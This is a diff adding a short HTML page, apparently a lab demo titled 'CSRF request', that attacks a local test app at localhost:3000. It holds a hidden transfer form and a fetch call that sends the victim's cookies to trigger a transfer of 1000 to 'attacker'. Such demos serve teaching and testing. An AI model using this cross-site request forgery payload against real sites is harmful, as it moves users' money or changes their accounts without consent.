@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CSRF 请求</title>
+  </head>
+  <body>
+    <form action="http://localhost:3000/operation" method="get" id="form">
+      <input type="hidden" name="receiver" value="ginlon" />
+      <input type="hidden" name="value" value="100000" />
+    </form>
+    <script>
+      // document.getElementById("form").submit();
+
+      fetch("http://localhost:3000/operation?to=attacker&amount=1000", {
+        method: "GET",
+        credentials: "include",
+      });
+    </script>
+  </body>
+</html>
